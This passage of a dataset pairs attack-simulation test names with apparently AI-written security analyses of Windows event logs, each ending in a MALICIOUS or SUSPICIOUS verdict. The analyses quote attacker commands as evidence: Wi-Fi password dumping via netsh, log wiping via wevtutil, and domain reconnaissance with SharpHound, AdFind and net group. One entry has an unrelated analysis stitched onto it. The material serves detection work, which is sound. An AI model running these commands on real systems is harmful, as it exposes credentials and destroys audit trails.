- **Potential Malicious Indicators:**
  - The clearing of security event logs by ""admin_test"" without apparent reason is a significant red flag for potential malicious activity. Clearing logs is a common method attackers use to erase traces of their actions.
  - The execution of unusual PowerShell commands generating and utilizing random strings and outputting to a file suggests possible attempts to obfuscate activities or gather system/user information surreptitiously.

- **False Positives or Legitimate Operations:**
  - While the use of `wevtutil.exe` can be legitimate, the context here suggests an intentional effort to remove traces, leading to heightened suspicion.
  - Regular system maintenance activities, software updates, and other utility usage logged, are typical and expected but must be viewed within the context of attempts to hide activities via log clearance.

### Conclusion

3. **Execution of SharpHound**:
   - **PowerShell Logs** and **Sysmon Logs** reveal the execution of a PowerShell script designed to run SharpHound (`SharpHound.exe`). SharpHound is a tool used for Active Directory reconnaissance, typically by attackers during the reconnaissance phase of an attack.
   - This execution is indicated by the command embedded in the PowerShell event: `""powershell.exe"" & {New-Item -Path \""$env:TEMP\\SharpHound\\\"" ... ```, with the intention to collect data about local admin rights.

4. **Use of Remote Management Host**:
   - Multiple instances of `wsmprovhost.exe` (Windows Remote Management Host) are the parent of these suspicious processes, indicating possible remote command execution.

### Assessment:

- **Suspicious Activities**:
  - The frequent clearing of event logs without business justification is suspicious and usually an indicator of potential compromise.
  - The use of SharpHound suggests reconnaissance activities, typically seen in lateral movement attempts within a network.
  - Elevated privileges and the use of PowerShell combined with suspicious external executable indication potentially unauthorized or malicious operations.

### Conclusion:

Based on these observations, the activity captured in these logs can be determined to be **MALICIOUS**. The combination of log clearing, PowerShell scripts executing with high integrity, and the use of a tool like SharpHound strongly suggests a security incident involving an unauthorized user leveraging administrative access for reconnaissance purposes.

### Recommendations:

1. **Immediate Containment**:
   - Isolate the affected host from the network to prevent further potential spread or data exfiltration.
   - Conduct a thorough review of the `admin_test` account for unauthorized access or anomalies.

2. **Further Investigation**:
   - Analyze network traffic for any unusual outbound connections.
   - Check for other compromised systems within the network using similar log patterns.
   - Evaluate if there have been recent phishing attempts or credential leaks.

3. **Remediation Steps**:
   - Reset passwords and enable multifactor authentication for accounts demonstrating suspicious behavior.
   - Apply patches and ensure systems are up-to-date.
   - Reinforce logging policies and potentially restrict the execution of scripts like those seen here.

4. **Enhance Monitoring**:
   - Enable full command logging for PowerShell and monitor for suspicious script execution.
   - Deploy Endpoint Detection and Response (EDR) tools to monitor for similar patterns of behavior.

This situation demonstrates the need for ongoing vigilance and the implementation of comprehensive security monitoring and incident response strategies to detect, respond, and recover from such anomalies effectively."
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Based on the provided Windows event logs, here's a detailed analysis:

### Analysis and Observations:

1. **System Time Manipulation:**
   - The logs contain multiple entries (e.g., Event ID 4616) indicating that system time was changed. This can be benign but is often considered suspicious activity, especially if performed by unauthorized users. Here, the ""LOCAL SERVICE"" account was used, which may require further contextual investigation to verify legitimacy.

2. **Privilege Use by ""admin_test"":**
   - There are several instances where the user ""admin_test"" logs in with a variety of high-privilege tokens (e.g., Event ID 4672). The privileges include `SeDebugPrivilege` and `SeImpersonatePrivilege`, which are commonly associated with system manipulation activities and potentially malicious behavior if not expected.

3. **Logon Events and Network Connections:**
   - A remote logon event is evident with ""logon type 3"" indicating a network logon by the user ""admin_test"" from a remote workstation (DESKTOP-3HL5B2P) using NTLM authentication. This is potentially suspicious as NTLM is less secure and can be subject to replay attacks.

4. **Event Logs Clearing:**
   - Critical logs for Security, System, and Windows PowerShell channels were cleared (evident from Event ID 1102, 104). This action is highly suspicious and usually indicative of malicious activity, intending to hide tracks.

5. **Sysmon Activity:**
   - Multiple entries show the execution of `wevtutil.exe` (System utility to manage event logs) with the command to clear logs (cl: clear). This directly correlates with the log clearing activity and suggests attempted obfuscation by an actor aware of system logging mechanisms.
   - Unusual commands executed through `cmd.exe` such as ""netsh wlan show profile * key=clear"" could indicate an attempt to extract saved Wi-Fi credentials, which is abnormal and suspect.

6. **Defender and System Updates:**
   - Logs indicate routine updates for Windows Defender (e.g., Event ID 19), which is benign and expected.

### Assessment:

- **Time Manipulation and Log File Clearing:** The combination of system time changes and log clearing operations executed by an administrative user is a strong indication of an effort to execute and then hide potentially unauthorized activities.
  
- **Use of Elevated Privileges & Off-the-Shelf Tools:** The user ""admin_test"" exercises high-level permissions with sensitive privileges and invokes system utilities in conjunction with command-line operations that align with potential credential harvesting.

### Resolution:

**MALICIOUS**

### Recommendations:
- Conduct a comprehensive forensic analysis of the host ""Server002"" to determine the full scope of compromise.
- Investigate user ""admin_test"" for unauthorized activities and ensure legitimate access.
- Review and audit network connections to the involved workstation (DESKTOP-3HL5B2P).
- Reinforce login and Authentication policies by disabling NTLM where possible.
- Ensure all Security and Monitoring logs are forwarded to a centralized SIEM to avoid local tampering.
- Consider using advanced threat detection mechanisms to monitor for similar patterns."
Security Software Discovery - Sysmon Service,"The logs provided display several activities on the Windows host that need careful analysis. Here’s a breakdown of notable findings:

1. **Event Log Clearing**: The Sysmon logs reveal multiple instances of `wevtutil.exe` being used to clear logs such as Sysmon, Application, Security, System, and Windows PowerShell. The use of this utility to clear event logs (Event IDs: 104 in System log, 1102 in Security log, etc.) is often associated with malicious activity since attackers may attempt to erase their tracks after unauthorized access or actions.

2. **Multiple Process Executions**: Various system processes were run under the `admin_test` account, including `wevtutil.exe`, `cmd.exe`, `fltMC.exe`, `findstr.exe`, and others, indicating potential misuse or automation. The chain of command execution with `cmd.exe /c fltmc.exe | findstr.exe` suggests system inquiry or manipulation activity.

3. **Privilege and Account Context**: Many of the actions occurred under a user with high integrity levels (high privilege), specifically `admin_test`, which further raises suspicion if these actions were unauthorized. There's also a notable lack of PowerShell log events which may indicate log tampering.

4. **Process Relationships**: Observationally, most processes have correlations originating from or interacting with `wevtutil.exe` or `cmd.exe`—a typical pattern in scripted malicious operations to cover tracks or gather information without direct user intervention.

5. **EdgeUpdate Activity**: While activity around `MicrosoftEdgeUpdate.exe` and its related processes is usually benign (related to auto-updates), it's noted alongside other potentially wild executions like log clearance which suggests checking for unusual modifications could be prudent.

Overall, these logs present several red flags indicating potentially malicious activity:

- The deliberate clearing of logs using `wevtutil.exe`, often a tactic associated with covering post-exploitation activities.
- The high privilege and scripted nature of various command line executions typically seen in unauthorized or covert operation contexts.
- Potentials of scheduled or triggered tasks given the event timing and lack of user-initiated log indicators.

### Resolution: MALICIOUS

Given the evidence of log tampering, centralized script executions under a high-privilege user context, and other indicators pointing to an attempt to hide activities, this activity is classified as MALICIOUS. Immediate steps would involve isolating the machine from the network, conducting a comprehensive memory and disk forensic investigation, and reviewing change management logs or alerts for any unauthorized access or configurations, while ensuring the system is cleaned, secured, and monitored closely for further anomalies."
Remote System Discovery - net group Domain Controller,"**Analysis of the Logs:**

1. **Clearing of Event Logs:**
   - There are multiple events showing the clearing of crucial logs (`EventID 104` for System and Windows PowerShell, `EventID 1102` for Security) by the user `admin_test`. This action, especially without prior notice or a legitimate reason, can be an indicator of malicious activity as it may be attempted to cover up tracks after unauthorized or suspicious actions.

2. **Command-Line and Process Activity:**
   - The logs contain the execution of potentially suspicious processes such as `whoami.exe`, `cmd.exe`, and `net.exe`. The execution of these commands can be used for reconnaissance within the system.
   - A `cmd.exe` execution was observed running the command to list domain controllers: `cmd.exe /c net group /domain ""Domain controllers""`. This is a common method used in lateral movement or privilege escalation activities as it identifies key targets within a network.

3. **Use of `wevtutil.exe`:**
   - There are several executions of `wevtutil.exe` with the `cl` (clear) command for different log channels. Regular usage of `wevtutil.exe` to clear logs is uncommon outside maintenance scenarios and could be used to hide traces of an attack.

4. **Processes Executing Under Admin Context and Without Logs:**
   - Processes like `wevtutil.exe`, `whoami.exe`, `cmd.exe`, and `net.exe` were executed under the context of `admin_test`, who had high integrity access, which raises a red flag if not sanctioned activities because of the potential security risks these processes pose when executed under administrative privileges.

5. **Failure in Security Auditing Events (EventID 5379):**
   - There are multiple failed credential access attempts related to `MicrosoftAccount`. The failures show `ReturnCode 3221226021`, indicating unsuccessful access. Repeated failures might suggest unauthorized attempts or configuration issues.

6. **Updates and Regular System Activities:**
   - While several standard update and maintenance processes like `wuauclt.exe` (Windows Update) and `AM_Delta.exe` (AntiMalware updates) are present, these entries appear consistent with routine system operations.

**Threat Assessment:**

The collected evidence outlines several concerning activities, notably the clearing of event logs and reconnaissance-like commands (such as enumerating domain controllers). Moreover, these activities are performed under an admin account, giving them potential to cause significant security breaches.

**Resolution:**
- **MALICIOUS** - The presence of cleared logs without justification, combined with reconnaissance actions and administrative clearance of logs, strongly indicates malicious intent or compromise of the system.

**Guidance on Proceeding:**
- Immediately investigate the user account `admin_test` for unauthorized access or compromise.
- Review access control policies and implement stricter monitoring, especially on privileged accounts.
- Conduct a thorough forensic analysis to uncover any other indicators of compromise and ensure there are no other active threats.
- Restore system logs from backups to retrieve audit trails affected by the `wevtutil` log clearing.
- Communicate with the IT security team to bolster defenses and advise users on recognizing and preventing unauthorized activities."
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon reviewing the Windows event logs provided, several points of interest and potential indicators of malicious activity have been identified:

1. **Log File Clearing (Suspicious Behavior):**
   - The clearing of logs is a significant red flag, often seen in attempts to cover up malicious activity. 
   - In this dataset, we see instances like Event ID 1102 in the Security log, indicating that the security event log was cleared. This was performed by the user `admin_test`.

2. **Unusual PowerShell Command Execution:**
   - The execution of PowerShell commands is often used in both administrative tasks and by attackers due to its powerful capabilities.
   - Here, we noted PowerShell execution with the command `Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force`, which could potentially be used to enumerate files relating to user data or configurations, which can be suspicious if such actions are not routine for the system.

3. **Use of Wevtutil to Clear Event Logs:**
   - The `wevtutil.exe` process is used several times with the command lines indicating clearing of various event logs (`Application`, `Security`, and `System` logs). This activity was conducted by the `admin_test` user and is generally suspicious, especially if not part of routine log management activities, as it can suggest the erasure of forensic evidence.

4. **System Integrity and Security Logs Monitoring:**
   - Time changes recorded in the System logs without clear context could indicate an attempt to manipulate log timestamps, although this was less evident in your provided data. 
   - However, combined with log clearing, any unexplained time adjustments can compound suspicions about system integrity being undermined.

5. **Process Executions with High Integrity Levels:**
   - There are high-integrity level executions of benign processes like ‘hostname.exe’ and ‘whoami.exe’. While they are not inherently malicious, if they occur frequently within short time periods without a clear administrative context, they might be used to assess the system environment by an attacker.

**Assessment and Resolution:**
- **Resolution: SUSPICIOUS** - The provided logs display activity that raises red flags typically associated with attempts to obfuscate actions and enumerate system information—processes that can be indicative of malicious reconnaissance or post-compromise activities. While not conclusively malicious without further context, it is highly suspicious due to the log clearing behavior and requires further investigation.

**Guidance on How to Proceed:**
- Initiate a detailed forensic investigation to determine the intent and extent of these activities.
- Examine the actions and context of the user `admin_test`, specifically any administrative tasks they were conducting that day.
- Check for any additional logs or backups prior to the clearing actions to gather insights or corroborative evidence of possible compromise.
- Monitor the system for further suspicious PowerShell commands or unusual log clearing.
- Implement tighter controls and auditing around the use of PowerShell and event log clearance.
"
Adfind -Listing password policy,"The logs exhibit multiple indicators of potentially malicious activity, most notably the clearing of event logs and suspicious process executions. Here's a detailed breakdown:

1. **Event Log Clearing**:
   - The Windows event logs have been cleared by the user ""admin_test"". This is witnessed in the system and security logs with items like `EventID"":""104""` for system and `EventID"":""1102""` for security, both indicating that logs were cleared. Clearing event logs is a common tactic used by attackers to cover their tracks after compromising a system.

2. **Unusual Process Activity**:
   - Multiple `wevtutil.exe` processes, which are responsible for event log maintenance, have been executed within seconds of each other in relation to different channels (e.g., PowerShell, System, Security). This is not typical and suggests an attempt to manipulate or erase event logs.
   - PowerShell (`powershell.exe`) is executed, a common vector for attacks. This is found in the Sysmon logs; however, the lack of additional context in the PowerShell log makes it harder to determine exactly what was executed.
   
3. **Execution of Known Attack Tools**:
   - The `cmd.exe` process executed a command referencing `AdFind.exe`, which is a tool often used by attackers for Active Directory enumeration, indicating possible reconnaissance activities.

4. **Privilege Escalation and Subsequent Activity**:
   - Event `4672` logs the use of special privileges by the SYSTEM account, which implies that significant actions requiring elevated rights might have occurred. This, in tandem with the other activities, strengthens the likelihood of malicious intent.

5. **Microsoft Edge Update Executions**:
   - While there are numerous Microsoft Edge update activities logged, which can be benign, these could also be used to conceal malicious behaviors. Checking the validity of these updates and ensuring they originate from trusted sources would be advisable.

Overall, given the logs cleared, the execution of potential attack tools, and the suspicious cyclical logging activity, this set of logs strongly indicates malicious behavior.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

  - Implement stricter access controls and monitor logins and admin actions.
  - Enhance audit logging and ensure they are securely stored and backed up to prevent tampering.
  
- **Recovery Plan**:
  - After ensuring the compromise is contained, initiate a full systems review and remediation plan. Revert any unauthorized changes identified during the investigation, and where necessary, reinstall affected systems to ensure they are clean."
Enumerate All Network Shares with SharpShares,"Based on the analysis of the provided Windows event logs, there are several indicators that point towards potentially malicious activity:

1. **Use of `wevtutil` Command for Clearing Logs**: 
   - The logs indicate that `wevtutil.exe` is executed with the command-line argument to clear the Sysmon event log (`wevtutil cl Microsoft-Windows-Sysmon/Operational`) in Event IDs 17983, 17995, 18003, 18007, and others. This activity is usually associated with covering tracks after potentially malicious actions have been performed.

2. **Execution of PowerShell with Suspicious Command**:
   - The PowerShell command executed includes calling an application named `SharpShares.exe` through `cmd` with specific parameters to query LDAP and save outputs to a file (Event IDs 18019, 18021). `SharpShares.exe` is often associated with lateral movement and system reconnaissance within an Active Directory environment.

3. **Clearing of Security and System Logs**:
   - The Security log (Event ID 30350) and System log (Event IDs 3568, 3569) show that they have been cleared by the `admin_test` user. Clearing of logs is a strong indicator of malicious intent as it is often done to remove traces of unauthorized or suspicious activities.

4. **Suspicious Process Executions**:
   - The `SharpShares.exe` process is executed from a temporary directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\ExternalPayloads`) which, combined with its reconnaissance characteristics, suggests possible malicious actions (Event ID 18022).

5. **Logon ID and Integrity Level**:
   - Multiple high-integrity operations are performed under the Logon ID `0x12C622`, which could suggest a persistent or escalated privilege session.

In light of these observations, these events prominently feature known suspicious activities commonly associated with malicious actors attempting to gather information, persist on a system, or erase tracks.

### Resolution: MALICIOUS

- Conduct a full forensic investigation on the host to uncover any further traces of compromise, specific payloads used, and access credentials potentially exposed.
- Change passwords and review user permissions, especially for the `admin_test` user.
- Review and enhance security monitoring and logging configurations to detect and prevent such activities in the future.
- Consider involving incident response or cybersecurity professionals for detailed analysis and containment strategies."
Process Discovery - Process Hacker,"Upon analyzing the provided Windows event logs from the host system, several key observations and potential indicators of malicious activity have been identified.

### Findings:

1. **PowerShell Activity**:
   - Multiple PowerShell events indicate that the `Process Hacker` application was executed using PowerShell. The use of PowerShell to launch this type of application can be indicative of a potential attempt to explore or exploit memory or process functions.
   - The specific command used:
     ```
     powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\ProcessHacker.exe""}
     ```
     Suggests an intent to conceal or automate the execution, a common tactic in post-exploitation scenarios.

2. **Event Log Clearance**:
   - System (EventID 104), Security (EventID 1102), and Windows PowerShell logs were cleared almost simultaneously by the user ""admin_test."" The clearance of logs is a suspicious activity indicating an attempt to remove traces of potentially malicious actions.
   - This action is supported by Sysmon entries where `wevtutil.exe` was used extensively for clearing logs, as shown in the command lines:
     ```
     ""C:\Windows\system32\wevtutil.exe"" cl [LogName]
     ```
   - Such behavior is often associated with malicious activities intending to hinder forensic investigations.

3. **User and Application Behavior**:
   - The security log entry shows a group membership enumeration for Builtin\Users, which in isolation may not be suspicious but could indicate reconnaissance efforts if correlated with other activities.
   - There are multiple entries for administrative tools and commands executed by the user ""admin_test,"" such as `whoami.exe` and `hostname.exe`, potentially indicative of a user enumerating system information.

4. **Process Activity and Execution**:
   - Processes like `SecureBootEncodeUEFI.exe` and SVCHOST activity do not have immediate red flags but should be monitored, considering the context of prior actions (log clearance and potential reconnaissance).

### Assessment:

Based on the analysis, the logs contain several exhibits of suspicious behavior primarily revolving around the use of PowerShell for potentially unauthorized activities and conscious efforts to clear event logs. Although the precise intent of these actions is not fully ascertainable without further context, the combination of these indicators suggests more than just benign administrative activities. Particularly, the clearance of logs strongly suggests an effort to hide activities, which is significant in many incident response scenarios.

### Recommended Resolution: **SUSPICIOUS**

This activity must be considered suspicious and warrants further investigation. The following steps are recommended:
- **Immediate Isolation**: Isolate the host from the network to prevent potential lateral movement.
- **In-depth Forensic Analysis**: Capture memory and disk images of the host for detailed forensic analysis to uncover the full scope and intent.
- **User Account Review**: Investigate the activities and permissions related to the user ""admin_test,"" and consider implementing stricter access controls if necessary.
- **Monitoring and Audit**: Enhance monitoring with a focus on PowerShell usage, process execution, and any further log clearance activities across the network.

These actions will help identify whether the activities are part of a broader attack and mitigate potential risks while ensuring system integrity."
Network Share Discovery PowerShell,"Upon analyzing the provided Windows event logs, several indicators suggest potentially suspicious activity that warrants further investigation:

1. **Event Log Clearing**: 
   - Multiple instances of log file clearing events are recorded across different channels (System, Windows PowerShell, Security logs). The events are attributed to the user `admin_test`, with the process `wevtutil.exe` actively involved in clearing logs. 
   - Event ID 104s and Event ID 1102 are indicative of events where logs were cleared (System, Security logs), typically a measure to cover tracks.

2. **PowerShell Execution**:
   - Instances of PowerShell usage (Event ID 600 and associated logs) were observed, specifically running the command `get-smbshare`. While this command itself is not inherently malicious, its context within cleared logs may indicate reconnaissance or lateral movement efforts.

3. **Unusual Command Line Execution**:
   - The `wevtutil.exe` tool from `C:\Windows\System32\` is used with the `cl` parameter to clear logs, which is not typical for day-to-day operations and is a standard tool misuse in compromising events.

4. **Account and Security Implications**:
   - All suspicious activities were performed under the `admin_test` account. This suggests possible misuse of administrative credentials, either through credential theft or insider threat.

Given these observations, we can conclude:

- **SUSPICIOUS**: The activities noted within these logs indicate actions that could be part of a malicious attack, such as footprint covering, credential misuse, or reconnaissance. Further investigation is required to confirm the intention and origin of these actions, focusing on verifying the legitimacy of actions performed by `admin_test`, and examining the affected server for signs of compromise or unauthorized access.

1. **Process Execution and Command-Line Activity:**
   - Multiple instances of the `wevtutil.exe` command line utility were used to clear event logs across various channels (Sysmon, Application, Security, and Windows PowerShell). This behavior is suspicious as it suggests an attempt to cover tracks, which is a common tactic used by attackers to hide their malicious activities. 
   - The execution of `powershell.exe` with a suspicious command string that includes downloading and executing a script from a GitHub repository related to the project ""S3cur3Th1sSh1t"" is highly suspicious. This script execution is remotely fetching a script titled ""WinPwn.ps1"" which can potentially be used for exploitation or post-exploitation activities.

2. **Privilege Escalation and Integrity Level:**
   - There was an event logged that indicates the usage of a series of high-privilege privileges such as `SeBackupPrivilege`, `SeRestorePrivilege`, `SeDebugPrivilege`, etc. This indicates that the user or process had elevated permissions, which when combined with the log-clearing activity, further points towards activity consistent with privilege abuse.

3. **Log Clearing:**
   - Multiple event logs were cleared close to each other in time, specifically targeting the System, Security, and Windows PowerShell logs. Log clearing in this context is an immediate red flag, as it is often associated with malicious intent to hide malicious traces on a system.

4. **Network Activity:**
   - The log entry for `logon` indicates a network-based logon (LogonType 3) from an IP address, which could suggest remote access.

Given these observations, the activities logged are indicative of an attempt to cover tracks and perform unauthorized or malicious operations on the host system. 

**Assessment:**
The combination of executed processes with suspicious command lines and multiple log-clearing events strongly indicates malicious activity.

**Resolution: MALICIOUS**  
This activity cannot be considered benign due to the serious implications of the log clearing and unauthorized script execution. Immediate action should be taken to:

- Perform a full forensic investigation to gather more evidence regarding the initial entry point, scope of attack, and any other assets affected.
- Review and audit any other machines or systems in the network that might share similar access logs or configurations.
- Analyze firewall and network logs to trace and block any further communications with the external IP associated with the remote logon or commands.
- Notify relevant stakeholders and prepare for a potential incident response depending on the nature of data or assets compromised."
Remote System Discovery - net,"Upon reviewing the provided logs, several indicators of suspicious and potential malicious activity have been identified:

### Analysis

1. **Event Log Clearance:**
   - System logs (`EventID 104`), PowerShell logs (`EventID 104`), and Security logs (`EventID 1102`) were cleared by the user `admin_test` at `2024-10-21 09:14:40`. This action is often indicative of an attempt to cover tracks and is a common tactic used in malicious activities to remove traces of illicit actions. The use of the `wevtutil` command to clear logs is evident from Sysmon logs showing its execution with the command lines such as `wevtutil.exe cl Security`, `wevtutil.exe cl System`, and `wevtutil.exe cl Windows PowerShell`.

2. **Privilege Escalation:**
   - The user `admin_test` possesses numerous elevated privileges, including `SeDebugPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege` among others (EventID 4672). The consistent elevation of privileges could be indicative of an attempt to gain broader system control beyond standard administrative permissions.

3. **Suspicious Command Execution:**
   - The execution of the `cmd.exe` with network-related commands (`Net view`) could indicate reconnaissance activities on the network, possibly to enumerate hosts and resources available (Sysmon EventID 1, ProcessID 2696).

4. **Multiple Whoami Executions:**
   - Several executions of `whoami.exe` (Sysmon EventID 1) suggest that the user is attempting to verify their access and privileges frequently, which might be to confirm the success of a privilege escalation or to monitor changes in user access levels.

5. **Network Service Logon Failures:**
   - Multiple logon failures and subsequent retries for a `MicrosoftAccount:user=02txoixylodcstop` (EventID 5379) indicate possible attempts at gaining unauthorized access via brute force or credential stuffing.

### Assessment

The combination of these activities strongly suggests that there is potential malicious activity on the host server. The clearing of event logs is particularly concerning, as it is a hallmark of malicious behavior aimed at avoiding detection. The elevated privileges and network reconnaissance add to the suspicion of a potential compromise.

MSFT Get-GPO Cmdlet,"**Detailed Log Analysis**

Upon reviewing the provided Windows event logs, I've identified several entries that suggest suspicious behavior on the host machine, Server002. Below is the detailed analysis:

1. **Execution of Processes in Temp Directory**:
   - A process `DismHost.exe` executed from `C:\Users\ADMIN_~1\AppData\Local\Temp\D48C763E-E865-4B4D-ACE5-1BD1680CCD71`. The `Temp` directory is not typically used for executing system-level applications like `DismHost.exe`, which is often involved in system image servicing. This could potentially indicate malicious use.
   
2. **Command Line Use of `wevtutil.exe`**:
   - There are repeated uses of `wevtutil.exe` to clear logs (`cl`) including the System, Application, and Security logs. Clearing event logs is a common tactic to cover tracks after malicious activities. Moreover, the command is executed by the `admin_test` user at a high integrity level, indicating potential misuse of administrative privileges.

3. **Security Log Event ID 1102**:
   - The Security logs show an Event ID 1102 which indicates the audit log was cleared. This is highly indicative of malicious behavior as attackers often seek to remove traces of their activities.

4. **Execution of `whoami` and `hostname`**:
   - Commands like `whoami.exe` and `hostname.exe` were executed, which are often used to understand the current user’s privileges and system identity. While not inherently malicious, in combination with other suspicious activities, it can indicate reconnaissance activity by a potential attacker.

5. **Suspicious PowerShell Activity**:
   - The PowerShell command `Get-GPO -Domain $ENV:userdnsdomain -All` was executed. This command lists group policies for the domain, usually as part of reconnaissance activities to understand domain configurations, potentially to exploit them.

6. **Sequence of Sysmon Events**:
   - Several `conhost.exe` processes are spawned after the execution of `wevtutil.exe` and `PowerShell.exe`. These might be attempts to manipulate console window hosts for executing further commands or to interact with system processes stealthily.

7. **Indicators of Persistence Mechanisms or Software Deployment Artefacts**:
   - Activities related to Microsoft Edge updates and installations appear in the logs. While these may be legitimate update processes for Microsoft Edge, if not initiated by a known task or software update policy, they could possibly indicate a software deployment vector being misused or a persistence mechanism being installed.

**Assessment of the Situation**

The combination of log clearance, execution of processes from unusual paths, PowerShell usage for potential reconnaissance, and consistent high-level permission use indicates a high likelihood of malicious activity on the host.

**Threats or Risks Identified**

- Potential system compromise, indicated by the presence of activities to cover tracks.
- Misuse of administrative privileges, evident from the execution context of the tasks.
- Extensive system reconnaissance possibly leading up to further exploitation.

**Guidance**

1. **Immediate Actions**:
   - Isolate the affected host from the network to prevent further spread or exfiltration of data.
   - Take a complete forensic image of the system for further analysis.
   - Review user accounts, especially `admin_test`, for any unauthorized changes or access patterns.

2. **Follow-up Actions**:
   - Check for known vulnerabilities being exploited on the system, especially concerning PowerShell and administrative tools such as `wevtutil.exe`.
   - Conduct a thorough investigation of network logs for suspicious outbound or lateral movement patterns.
   - Validate the system's software management and update configurations to ensure they were not altered.

3. **Long-term Considerations**:
   - Enhance monitoring for abnormal activity indicative of reconnaissance or log tampering.
   - Implement stricter controls around the use of administrative tools and PowerShell scripts.

**Resolution**: Given the observed actions and their context, I resolve the situation as **MALICIOUS** – the activity strongly indicates intentional malicious actions, requiring immediate and comprehensive investigation and remediation efforts."
Enumerate Windows Security Log via WevtUtil,"Upon analyzing the Windows event logs, several indicators suggest suspicious activity:

1. **Log Clearing**: Multiple events indicate the clearing of logs. Specifically:
    - Security Log (Event ID 1102) and System Log (Event ID 104) were cleared using the `wevtutil` command by the user `admin_test`. This behavior is often associated with an attempt to cover tracks after unauthorized actions.

2. **Privileged Access**: There are multiple instances of Event ID 4672, indicating that the user `admin_test` was granted special privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege). The acquisition of such privileges without a clear reason can be indicative of privilege escalation attempts.

3. **Unusual Process Activity**:
    - The use of `wevtutil` and command-line interactions with `cmd.exe` (as seen in Events with `Commandline` involving `wevtutil` and `enum-logs`) by `admin_test` might indicate suspicious script or maintenance activities. 
    - Processes like `conhost.exe` are related to command-line interfaces and consistent spawning can be linked to command-line automation scripts or suspicious activities if not part of normal operations.

4. **Time Changes**: Events with ID 4616, related to time changes, indicate minor time adjustments. This can be part of normal time synchronization but can also be exploited in specific attacks to manipulate log timestamps.

5. **Frequent Execution of `whoami.exe` and `hostname.exe`**: While generally benign, the execution of these utilities in the described context can be part of a reconnaissance or script activity to gather info about the current system and user context.

Based on the combination of log clearing (which is especially concerning), privileged access events without clear justification, and unusual process executions, these logs raise significant red flags about potential malicious activities.

**Situation Assessment & Recommendations**:

- **Threat/Risk Assessment**: The observed activities suggest attempts to hide malicious actions, likely involving privilege escalation. This presents a high risk to the system's integrity and security.

- **Resolution**: **SUSPICIOUS**

To confirm and finalize the assessment:
- **Conduct a Deep Dive Analysis**: Obtain full context for each event, especially verifying whether the actions of `admin_test` were authorized.
- **Forensic Imaging**: Create a forensic image of the affected system for detailed offline analysis.
- **Network Monitoring**: Enable stricter monitoring and capture network traffic from the system in question.
- **Enhance Logging**: Ensure that logging is forwarded off-system to prevent loss from any future log clearing attempts.
- **Review and Harden Permissions**: Verify user permissions and tighten unnecessary privileges, especially for administrative accounts.

Proceed with a thorough investigation and possibly involve incident response to address the potential compromise fully."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon analyzing the provided Windows event logs, I have identified some key findings that suggest potentially suspicious activities that warrant further investigation:

1. **System Log Entries**:
   - **LogFileCleared Events**: Event ID 104 indicates that logs for the ""System"" and ""Windows PowerShell"" channels were cleared by the user ""admin_test"". This activity is unusual, particularly if not part of standard maintenance or administrative tasks, as it may indicate an attempt to cover tracks after potentially unauthorized actions.
   
2. **Security Log Entries**:
   - **Log File Cleared**: Specifically, Event ID 1102 indicates the Security log has been cleared by the same user ""admin_test"". Clearing security logs is a notable indicator of potential malicious activity as it can be used to hide unauthorized access or actions.
   - **Repeated Access Attempts**: There are multiple Event ID 5379 logs, which record unsuccessful attempts to access Windows Live or Microsoft Account services using the system account, with consistent failure code 3221226021. These repeated unsuccessful attempts might indicate a brute-force attempt or misconfiguration, but further context is needed.

3. **Sysmon Log Entries**:
   - **wevtutil.exe Usage**: There are multiple instances of ""wevtutil.exe"" being executed by the user ""admin_test"" with various command-line instructions for clearing logs (e.g., ""wevtutil.exe cl System""). The command is consistent with actions taken to clear event logs, reinforcing the observation of log clearing attempts.
   - **PowerShell Execution**: The execution of a PowerShell script performing operations across the network is noted. While PowerShell tasks can be legitimate, they are also frequently used by attackers for lateral movement or data gathering.

4. **PowerShell Log Entries**:
   - **PowerShell Command Execution**: Observed execution of PowerShell with scripts for querying directory services. While not inherently malicious, these commands can be used for reconnaissance in a compromised environment.

5. **Windows Update Events**:
   - The logs contain events related to Windows Defender update processes and Microsoft Edge updates from the WindowsUpdateClient. These are typical system activities and do not pose immediate concern provided they correspond to legitimate and expected update actions.

### Assessment:
This collection of events contains both routine system operations and indicators of potentially suspicious behavior. The log clearing activities and the execution of PowerShell scripts by an admin-like user combined with directly manipulated logging functions suggest an attempt to evade detection.

### Resolution:
The overall assessment of the situation leads to a classification of **SUSPICIOUS**. The activities, especially log clearances performed by ""admin_test"", suggest the need for further investigation to determine the legitimacy of the user's actions and whether they align with expected administrative maintenance, as well as to ensure there was no unauthorized access or data manipulation.

### Guidance:
- **Review User Access**: Verify the actions of ""admin_test"" and establish whether these actions were authorized and justified. Confirm their role and typical tasks within the organization.
- **Audit Changes and Permissions**: Check recent changes in configurations and permissions to detect any unauthorized alterations.
- **Implement Monitoring and Alerts**: Enhance logging and monitoring for sensitive accounts and critical systems. Investigate any further attempts to clear logs or execute scripts.
- **Conduct a Network Review**: Examine network logs for any unusual patterns, particularly around the times when logs were cleared.
- **Isolate and Examine Systems**: If unauthorized activities are confirmed, isolate affected systems to conduct a detailed forensic analysis."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"After carefully reviewing the provided Windows event logs, I have identified several points of interest:

1. **Use of `wevtutil.exe`**: The repeated execution of `wevtutil.exe` to clear logs (through command lines such as `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, and `wevtutil.exe cl Security`) is abnormal and could indicate an attempt to cover tracks. Clearing system logs is a common tactic used by adversaries to erase evidence of malicious activity.

2. **PowerShell Command**: The PowerShell command executed (`Get-adcomputer -SearchScope subtree -filter \""name -like '*'\"" -Properties *`) seems to be gathering extensive information on Active Directory computers. Depending on the context, this could be benign or part of a reconnaissance phase in an attack.

3. **Logon and Privilege Information**: All executed processes, including potentially sensitive ones like PowerShell and `wevtutil.exe`, were run by a user ""SERVER002\admin_test"" with a high integrity level. The actions were performed under this user's context, notably using a high level of access.

4. **Log File Clearing**: There are multiple events indicating that logs (System, Security, and Windows PowerShell) were cleared by the user ""admin_test"". This is highly suspicious and is often a tactic used by attackers after compromising a system to hide their activities and maintain stealth.

